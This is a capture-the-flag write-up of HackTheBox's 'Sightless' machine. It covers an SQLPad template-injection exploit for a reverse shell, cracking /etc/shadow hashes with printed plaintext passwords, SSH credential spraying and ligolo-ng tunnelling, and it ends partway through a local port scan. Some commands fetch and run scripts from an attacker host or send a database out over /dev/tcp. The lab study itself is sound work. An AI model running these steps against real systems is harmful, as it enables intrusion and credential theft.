---
render_with_liquid: false
title: HackTheBox Writeup  Sightless
date: 2024-10-03 18:26:44 +1400
tags: [hackthebox, nmap, linux, feroxbuster, hakrlawler, subdomain, sqlpad, ssti, cve-2022-0944, docker, docker-escape, discover-secrets, hashcat, credentials-stuffing, netexec, froxlor, ligolo-ng, chrome, chrome-remote-debugging, froxlor2rce, php]
---



`Sightless` is an easy-difficulty Linux machine featuring a website for a company offering various services. Enumeration of the website reveals an `SQLPad` instance vulnerable to template injection `[CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)`, which is leveraged to gain a foothold inside a Docker container. Further enumeration reveals the `/etc/shadow` file with a password hash, which is cracked to reveal the password, granting `SSH` access to the host. Post-exploitation enumeration reveals a `Froxlor` instance vulnerable to Blind `XSS` `[CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070)`. This is leveraged to gain access to the `FTP` service, which contains a `KeePass` database. Accessing the database reveals the root `SSH` keys, leading to a privileged shell on the host.


# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ pt init '10.10.11.32 sightless.htb sqlpad.sightless.htb'
+-----------+--------+-------------+----------------------+
|  PROFILE  | STATUS |     IP      |        DOMAIN        |
+-----------+--------+-------------+----------------------+
| sightless | on     | 10.10.11.32 | sightless.htb        |
| sightless | on     | 10.10.11.32 | sqlpad.sightless.htb |
+-----------+--------+-------------+----------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Thu Oct  3 18:26:44 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,80, 10.10.11.32
Nmap scan report for 10.10.11.32
Host is up, received user-set (0.18s latency).
Scanned at 2024-10-03 18:26:44 CST for 580s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|     Invalid command: try being more creative
|   Verifier: 
|_    220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGoivagBalUNqQKPAE2WFpkFMj+vKwO9D3RiUUxsnkBNKXp5ql1R+kvjG89Iknc24EDKuRWDzEivKXYrZJE9fxg=
|   256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA4BBc5R8qY5gFPDOqODeLBteW5rxF+qR5j36q9mO+bu
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=9%D=10/3%Time=66FE7170%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20
SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20
SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x
SF:20being\x20more\x20creative\r\n")%r(Verifier,44,"220\x20ProFTPD\x20Serv
SF:er\x20\(sightless\.htb\x20FTP\x20Server\)\x20\[::ffff:10\.10\.11\.32\]\
SF:r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Oct  3 18:36:24 2024 -- 1 IP address (1 host up) scanned in 580.83 seconds
```


## 80 - HTTP : Database and server management solutions


### Info

```ruby
http://sightless.htb [200] [Sightless.htb] [nginx/1.18.0 (Ubuntu)] [9f1fdce1dea48db01510fb60d137c5957a41d0de] [Nginx:1.18.0,Ubuntu]
```

![](/assets/obsidian/1e4ec57dc190c27c0bb22b139149d8aa.jpg)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt
```

```bash
200      GET      105l      389w     4993c http://sightless.htb/
301      GET        7l       12w      178c http://sightless.htb/icones => http://sightless.htb/icones/
301      GET        7l       12w      178c http://sightless.htb/images => http://sightless.htb/images/
200      GET      340l     2193w   190652c http://sightless.htb/images/logo.png
200      GET      341l      620w     6252c http://sightless.htb/style.css
```

# User Flag
---

## Shell as root in docker container


### Enumeration

- Discovered a subdomain : `sqlpad.sightless.htb`. Add to hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cat httpx/urls.txt | hakrawler -s -insecure -d 5 -subs -u | anew hakrawler.txt | grep -i sightless.htb | sort
[href] http://sqlpad.sightless.htb/
[href] mailto:sales@sightless.htb
```


### 80 - SQLPad 6.10.0 : SSTI (CVE-2022-0944)

> http://sqlpad.sightless.htb/

![](/assets/obsidian/4232df89acebb8569d90706340e1171f.png)

- `SQLPad version 6.10.0`

![](/assets/obsidian/9f2f658aae579cf85d9b23321fc2a6d4.png)

- Google : `sqlpad 6.10 exploit`

> Info - https://github.com/advisories/GHSA-xrh7-6fvm-56v5

![](/assets/obsidian/e0462abe00e5653335dbc4c4f73690e3.png)

> POC - https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb

![](/assets/obsidian/0616436a64b116922c28fa1ccfb553b5.png)

> Exploit POC - https://github.com/shhrew/CVE-2022-0944

```bash
cd exploit
git clone https://github.com/shhrew/CVE-2022-0944
cd CVE-2022-0944
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless/exploit/CVE-2022-0944]
└─$ python main.py http://sqlpad.sightless.htb 10.10.14.75 1111
[∧] Trying to bind to 10.10.14.75 on port 1111: Trying 10.10.14.75
Exception in thread Thread-1 (start_listener):
Traceback (most recent call last):
  File "/usr/lib/python3.12/threading.py", line 1075, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.12/threading.py", line 1012, in run
    self._target(*self._args, **self._kwargs)
  File "/home/kali/htb/Sightless/exploit/CVE-2022-0944/main.py", line 72, in start_listener
    listener = listen(lport, bindaddr=lhost)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/pwnlib/tubes/listen.py", line 108, in __init__
    listen_sock.bind(self.sockaddr)
OSError: [Errno 98] Address already in use
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.32] 54774
/bin/sh: 0: can't access tty; job control turned off

# /usr/bin/script -qc /bin/bash /dev/null
root@c184118df0a6:/var/lib/sqlpad# ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
root@c184118df0a6:/var/lib/sqlpad# stty rows 50 columns 209
root@c184118df0a6:/var/lib/sqlpad# id
uid=0(root) gid=0(root) groups=0(root)
```

It's a docker container

```bash
root@c184118df0a6:/var/lib/sqlpad# ls -latr /
total 936
drwxr-xr-x   2 root root   4096 Oct  3  2021 boot
drwxr-xr-x   1 root root   4096 Feb 28  2022 var
drwxr-xr-x   2 root root   4096 Feb 28  2022 srv
drwxr-xr-x   2 root root   4096 Feb 28  2022 sbin
drwxr-xr-x   2 root root   4096 Feb 28  2022 mnt
drwxr-xr-x   2 root root   4096 Feb 28  2022 media
drwxr-xr-x   2 root root   4096 Feb 28  2022 lib64
drwxr-xr-x   2 root root   4096 Feb 28  2022 bin
drwxr-xr-x   1 root root   4096 Mar  2  2022 lib
drwxr-xr-x   1 root root   4096 Mar  2  2022 opt
-rwxr-xr-x   1 root root    413 Mar 12  2022 docker-entrypoint
drwxr-xr-x   1 root root   4096 Mar 12  2022 usr
-rwxr-xr-x   1 root root      0 Aug  2 09:30 .dockerenv
[...]
```


## From root in docker container to michael on host


### Enumeration

- No secrets in environment variable (It's common to have credentials in environment variables for docker containers)

```bash
root@c184118df0a6:/var/lib/sqlpad# env
HOSTNAME=c184118df0a6
YARN_VERSION=1.22.17
PWD=/var/lib/sqlpad
SQLPAD_DB_PATH=/var/lib/sqlpad
NODE_ENV=production
SQLPAD_PORT=3000
HOME=/root
SQLPAD_AUTH_DISABLED_DEFAULT_ROLE=admin
TERM=xterm
SHLVL=1
SQLPAD_AUTH_DISABLED=true
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE_VERSION=16.14.0
_=/usr/bin/env
OLDPWD=/home
```

- No interesting result from **deepce**

```bash
root@c184118df0a6:/var/lib/sqlpad# wget -q http://10.10.14.75/deepce.sh -O - | bash -s --
```

- Nothing interesting in root's home folder

```bash
root@c184118df0a6:/home# find ~ -type f,l -ls 2>/dev/null
   397799      4 -rw-r--r--   1 root     root          570 Jan 31  2010 /root/.bashrc
   397800      4 -rw-r--r--   1 root     root          148 Aug 17  2015 /root/.profile
   425324      0 lrwxrwxrwx   1 root     root            9 Aug  9 09:42 /root/.bash_history -> /dev/null
   402091      4 -rw-------   1 root     root          600 Mar  2  2022 /root/.gnupg/random_seed
   405409     44 -rw-r--r--   1 root     root        41850 Mar  2  2022 /root/.gnupg/pubring.kbx
   405411      4 -rw-------   1 root     root         1200 Mar  2  2022 /root/.gnupg/trustdb.gpg
   405410     32 -rw-r--r--   1 root     root        30952 Mar  2  2022 /root/.gnupg/pubring.kbx~
   402087      4 -rw-r--r--   1 root     root            5 Mar  2  2022 /root/.gnupg/crls.d/DIR.txt
   402095      4 -rw-r--r--   1 root     root         1415 Mar  2  2022 /root/.npm/_logs/2022-03-02T10_06_52_661Z-debug-0.log
```

- There are regular users on the machine

```bash
root@c184118df0a6:/home# find . -type f,l -ls 2>/dev/null
   402054      4 -rw-r--r--   1 node     node         3526 Apr 18  2019 ./node/.bashrc
   402055      4 -rw-r--r--   1 node     node          807 Apr 18  2019 ./node/.profile
   402053      4 -rw-r--r--   1 node     node          220 Apr 18  2019 ./node/.bash_logout
   425489      0 lrwxrwxrwx   1 root     root            9 Aug  9 09:42 ./node/.bash_history -> /dev/null
   425487      0 lrwxrwxrwx   1 root     root            9 Aug  9 09:42 ./michael/.bash_history -> /dev/null
   425440      4 -rw-r--r--   1 michael  michael      3526 Apr 18  2019 ./michael/.bashrc
   425441      4 -rw-r--r--   1 michael  michael       807 Apr 18  2019 ./michael/.profile
   425442      4 -rw-r--r--   1 michael  michael       220 Apr 18  2019 ./michael/.bash_logout
```

- Mounted paths from host

```bash
root@c184118df0a6:/var/lib/sqlpad# mount
[...]
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/resolv.conf type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hostname type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /etc/hosts type ext4 (rw,relatime)
/dev/mapper/ubuntu--vg-ubuntu--lv on /var/lib/sqlpad type ext4 (rw,relatime)
[...]
```

- Process list

```bash
root@c184118df0a6:/var/lib/sqlpad# bash -c 'for i in $(ls /proc | grep -Eo "[0-9]+" | sort -nu); do CMDLINE=$(cat /proc/$i/cmdline 2>/dev/null | tr "\0" " " | sort -s -n -k 1,1); if [[ -n $CMDLINE ]]; then echo -e "$i | $CMDLINE"; fi; done'
1 | node /usr/app/server.js
[...]
```

- Netstat
	- Only port `3000` is listening, which is the **sqlpad** service

```bash
root@c184118df0a6:/home# awk 'function hextodec(str,ret,n,i,k,c){
>     ret = 0
>     n = length(str)
>     for (i = 1; i <= n; i++) {
>         c = tolower(substr(str, i, 1))
>         k = index("123456789abcdef", c)
>         ret = ret * 16 + k
>     }
>     return ret
> }
> function getIP(str,ret){
>     ret=hextodec(substr(str,index(str,":")-2,2));
>     for (i=5; i>0; i-=2) {
>         ret = ret"."hextodec(substr(str,i,2))
>     }
>     ret = ret":"hextodec(substr(str,index(str,":")+1,4))
>     return ret
> }
> NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp
Local - Remote
0.0.0.0:3000 - 0.0.0.0:0
[...]
```

### Harvesting


#### Sqlite database

```bash
root@c184118df0a6:/var/lib/sqlpad# ls -latr
total 200
drwxr-xr-x 1 root root   4096 Mar 12  2022 ..
drwxr-xr-x 2 root root   4096 Aug  9 11:17 cache
drwxr-xr-x 2 root root   4096 Oct  3 14:49 sessions
drwxr-xr-x 4 root root   4096 Oct  3 16:54 .
-rw-r--r-- 1 root root 188416 Oct  3 16:55 sqlpad.sqlite
```

Download the **sqlite** database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ nc -lvnp 444 > loot/sqlpad.sqlite
listening on [any] 444 ...
```

```bash
root@c184118df0a6:/var/lib/sqlpad# cat sqlpad.sqlite > /dev/tcp/10.10.14.75/444
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ sqlite3 loot/sqlpad.sqlite
SQLite version 3.46.0 2024-05-23 13:25:27
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .mode columns
sqlite> .tables
batches              query_acl            statements
cache                query_tags           users
connection_accesses  schema_version       vw_query_history
connections          service_tokens
queries              sessions
sqlite> .schema users
CREATE TABLE `users` (`id` VARCHAR(255) UNIQUE PRIMARY KEY, `email` VARCHAR(255), `role` VARCHAR(255) NOT NULL, `name` VARCHAR(255), `passhash` VARCHAR(255), `password_reset_id` UUID UNIQUE, `data` JSON, `signup_at` DATETIME, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `disabled` TINYINT(1), `sync_auth_role` TINYINT(1), `ldap_id` VARCHAR(255));
CREATE UNIQUE INDEX `users_email` ON `users` (`email`) WHERE `email` IS NOT NULL;
CREATE UNIQUE INDEX `users_ldap_id` ON `users` (`ldap_id`) WHERE `ldap_id` IS NOT NULL;
sqlite> select email, passhash from users;
email                passhash
-------------------  ------------------------------------------------------------
admin@sightless.htb  $2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC
john@sightless.htb
```

Write hash to file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cat loot/sqlpad.sqlite.hash
admin:$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC
```

#### /etc/shadow

- Saved to `loot/shadow`

```bash
root@c184118df0a6:/var/lib/sqlpad# cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$/Mo8R4wtiTNfTNVN$SMYyJjgjGl80eE8l3a.sphhbO3xidDQ/TtdAMXBHel09Taz9QAw8ItZQzrzivz9EPUU6EWXjVG1jGio23izss/:19999:0:99999:7:::
```

### Crack hashes

- `loot/shadow`

```bash
PS C:\Users\GOD> cd C:\Users\GOD\Documents\Sec\hashcat-6.2.6\; hashcat.exe H:\VM-Share\Kali\shadow H:\VM-Share\Kali\rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
[...]

PS C:\Users\GOD\Documents\Sec\hashcat-6.2.6> cd C:\Users\GOD\Documents\Sec\hashcat-6.2.6\; hashcat.exe H:\VM-Share\Kali\shadow H:\VM-Share\Kali\rockyou.txt --show --user
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
[...]
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
michael:$6$/Mo8R4wtiTNfTNVN$SMYyJjgjGl80eE8l3a.sphhbO3xidDQ/TtdAMXBHel09Taz9QAw8ItZQzrzivz9EPUU6EWXjVG1jGio23izss/:insaneclownposse
```

- `loot/sqlpad.sqlite.hash`

```bash
PS C:\Users\GOD\Documents\Sec\hashcat-6.2.6> cd C:\Users\GOD\Documents\Sec\hashcat-6.2.6\; hashcat.exe H:\VM-Share\Kali\sqlpad.sqlite.hash H:\VM-Share\Kali\rockyou.txt --user -m 3200
hashcat (v6.2.6) starting
[...]

PS C:\Users\GOD\Documents\Sec\hashcat-6.2.6> cd C:\Users\GOD\Documents\Sec\hashcat-6.2.6\; hashcat.exe H:\VM-Share\Kali\sqlpad.sqlite.hash H:\VM-Share\Kali\rockyou.txt --user -m 3200 --show
admin:$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC:admin
```

### 22 - SSH : Credential stuffing

> `creds.lst`

```bash
root:blindside
michael:insaneclownposse
admin:admin
john:
```

Split it to user and password list

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cat creds.lst | cut -d ":" -f 2- | sed '/^[[:space:]]*$/d' | sort -u > pass.lst; cat creds.lst | cut -d ":" -f 1 | sed '/^[[:space:]]*$/d' | sort -u > users.lst
```

Spray on ssh port

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ nxc ssh $(pt get rhost) -u users.lst -p pass.lst --continue-on-success --gfail-limit 3
SSH         10.10.11.32     22     sightless.htb    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.32     22     sightless.htb    [-] admin:admin
SSH         10.10.11.32     22     sightless.htb    [-] john:admin
SSH         10.10.11.32     22     sightless.htb    [-] michael:admin
SSH         10.10.11.32     22     sightless.htb    [-] root:admin
SSH         10.10.11.32     22     sightless.htb    [-] admin:blindside
SSH         10.10.11.32     22     sightless.htb    [-] john:blindside
SSH         10.10.11.32     22     sightless.htb    [-] michael:blindside
SSH         10.10.11.32     22     sightless.htb    [-] root:blindside
SSH         10.10.11.32     22     sightless.htb    [-] admin:insaneclownposse
SSH         10.10.11.32     22     sightless.htb    [-] john:insaneclownposse
SSH         10.10.11.32     22     sightless.htb    [+] michael:insaneclownposse  Linux - Shell access!
SSH         10.10.11.32     22     sightless.htb    [-] root:insaneclownposse
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cssh $(pt get rhost) michael 'insaneclownposse'
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
Last login: Thu Oct  3 17:37:20 2024 from 10.10.16.32
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
michael@sightless:~$ cat user.txt
1f192be45db46c3be93ad25f8086e925
```


# Root Flag
---

## From michael to root


### Discover and enumerate Froxlor service


#### Check for ports that can't be accessed externally

Gather a list of ports that weren't able to be scanned by **nmap** from outside the machine

```bash
netstat -ltnp
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cat enum/netstat.log
tcp   LISTEN 0      10         127.0.0.1:44769      0.0.0.0:*
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*
tcp   LISTEN 0      511        127.0.0.1:8080       0.0.0.0:*
tcp   LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*
tcp   LISTEN 0      4096       127.0.0.1:46415      0.0.0.0:*
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*
tcp   LISTEN 0      5          127.0.0.1:53341      0.0.0.0:*
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*
tcp   LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*
tcp   LISTEN 0      128             [::]:22            [::]:*
tcp   LISTEN 0      128                *:21               *:*
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cat enum/netstat.log | awk '{print $4}' | cut -d':' -f2 | sed '/^[[:space:]]*$/d' | sort -u > netstat_all_ports.txt

┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ cat nmap/all_tcp_ports.nmap | tail -n +2 | grep -i open | awk '{print $1}' | cut -d'/' -f1 | sort -u > nmap_tcp_ports.txt

┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ comm -23 netstat_all_ports.txt nmap_tcp_ports.txt | sort -nu | tr '\n' ',' | tee local_ports.txt
53,3000,3306,8080,33060,42461,44495,56249, 
```

#### Use ligolo-ng to access ports on target's localhost

Use **ligolo-ng** to create a tunnel in order to access the ports on target's localhost (Socks proxy won't be able to do it properly)

> Refer - https://github.com/nicocha30/ligolo-ng/wiki/Localhost

Start server

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/tunnel/ligolo-ng]
└─$ cd /opt/sectools/tunnel/ligolo-ng/; sudo ./proxy -laddr 0.0.0.0:8443 -selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
WARN[0000] Using self-signed certificates
WARN[0000] TLS Certificate fingerprint for ligolo is: 537B3F57398B647FC2CEA60A9FD9C1B92BB047E5ABCA5D945E39208E423F2D4F
INFO[0000] Listening on 0.0.0.0:8443
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.7.2-alpha

ligolo-ng » 
```

Start agent

```bash
michael@sightless:~$ curl http://10.10.14.75/ligolo -o /tmp/ligolo && chmod +x /tmp/ligolo
michael@sightless:~$ /tmp/ligolo -connect 10.10.14.75:8443 -ignore-cert
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.14.75:8443"
```

Setup interface, tunnel and route

```bash
ligolo-ng » session
error: no sessions available
ligolo-ng » INFO[3250] Agent joined.                                 name=michael@sightless remote="10.10.11.32:39842"
ligolo-ng »
ligolo-ng » session
? Specify a session : 2 - michael@sightless - 10.10.11.32:39842 - 9a105117-b198-4d0d-bedb-c9f56e32c90b
[Agent : michael@sightless] » ifcreate --name ligolo
INFO[3278] Creating a new "ligolo" interface...
INFO[3278] Interface created!
[Agent : michael@sightless] » tunnel_start --tun ligolo
[Agent : michael@sightless] » INFO[3299] Starting tunnel to michael@sightless
[Agent : michael@sightless] »
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/tunnel/ligolo-ng]
└─$ sudo ip route add 240.0.0.1/32 dev ligolo
```

#### Nmap scan

```bash

# Nmap 7.94SVN scan initiated Fri Oct  4 07:39:40 2024 as: /usr/lib/nmap/nmap --unprivileged -sVC --version-all -T4 -Pn -vv -oA ./nmap/local_tcp_scan -p 53,3000,3306,8080,33060,44769,46415,53341, 240.0.0.1
Nmap scan report for 240.0.0.1
Host is up, received user-set (0.44s latency).
Scanned at 2024-10-04 07:39:40 CST for 352s

PORT      STATE  SERVICE REASON       VERSION
53/tcp    closed domain  conn-refused
3000/tcp  open   ppp?    syn-ack
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     Strict-Transport-Security: max-age=15552000; includeSubDomains
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Referrer-Policy: same-origin
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 722
|     ETag: W/"2d2-dAYwY7qyD08NuZla+rFyq6/Qg9k"
|     Date: Thu, 03 Oct 2024 23:28:34 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>SQLPad</title>
|     <link rel="shortcut icon" href="/favicon.ico">
|     <!-- tauCharts css must be in a known path we can ref for image exports -->
|     <link rel="stylesheet" href="/javascripts/vendor/tauCharts/tauCharts.min.css" type="text/css" />
|     <script type="module" crossorigin src="/assets/index.33f5cd02.js"></
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     Strict-Transport-Security: max-age=15552000; includeSubDomains
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Referrer-Policy: same-origin
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 722
|     ETag: W/"2d2-dAYwY7qyD08NuZla+rFyq6/Qg9k"
|     Date: Thu, 03 Oct 2024 23:28:35 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>SQLPad</title>
|     <link rel="shortcut icon" href="/favicon.ico">
|     <!-- tauCharts css must be in a known path we can ref for image exports -->
|     <link rel="stylesheet" href="/javascripts/vendor/tauCharts/tauCharts.min.css" type="text/css" />
|     <script type="module" crossorigin src="/assets/index.33f5cd02.js"></
|   Help, NCP:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
3306/tcp  open   mysql   syn-ack      MySQL 8.0.39-0ubuntu0.22.04.1
| mysql-info:
|_  MySQL Error: #08S01Got timeout reading communication packets
8080/tcp  open   http    syn-ack      Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Froxlor
|_http-open-proxy: Proxy might be redirecting requests
33060/tcp open   socks5  syn-ack
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   Radmin:
|     authentication.mechanisms
|     MYSQL41
|     SHA256_MEMORY
|     doc.formats
|     text
|     client.interactive
|     compression
|     algorithm
|     deflate_stream
|     lz4_message
|     zstd_stream
|     node_type
|     mysql
|     client.pwd_expire_ok
|   SSLv23SessionReq:
|     Invalid message-frame."
|_    HY000
| socks-auth-info:
|_  No authentication
44769/tcp open   http    syn-ack      Google Chromecast httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
46415/tcp open   unknown syn-ack
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Date: Thu, 03 Oct 2024 23:29:00 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Hello, Help, Kerberos, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Date: Thu, 03 Oct 2024 23:28:30 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|_    404: Page Not Found
53341/tcp open   unknown syn-ack
| fingerprint-strings:
|   OfficeScan:
|     HTTP/1.1 404 Not Found
|     Content-Length:516
|     Content-Type:application/json; charset=utf-8
|     cache-control:no-cache
|     {"value":{"error":"unknown command","message":"unknown command: unknown command: ?CAVIT","stacktrace":"#0 0x55ed9ddf5e43 u003Cunknown>
|     0x55ed9dae44e7 u003Cunknown>
|     0x55ed9db4b6b2 u003Cunknown>
|     0x55ed9db4b18f u003Cunknown>
|     0x55ed9dab0a18 u003Cunknown>
|     0x55ed9ddba16b u003Cunknown>
|     0x55ed9ddbe0bb u003Cunknown>
|     0x55ed9dda6281 u003Cunknown>
|     0x55ed9ddbec22 u003Cunknown>
|     0x55ed9dd8b13f u003Cunknown>
|     0x55ed9daaf027 u003Cunknown>
|     0x7f2897e88d90 u003Cunknown>
|   apple-iphoto:
|     HTTP/1.1 404 Not Found
|     Content-Length:521
|     Content-Type:application/json; charset=utf-8
|     cache-control:no-cache
|     {"value":{"error":"unknown command","message":"unknown command: unknown command: server-info","stacktrace":"#0 0x55ed9ddf5e43 u003Cunknown>
|     0x55ed9dae44e7 u003Cunknown>
|     0x55ed9db4b6b2 u003Cunknown>
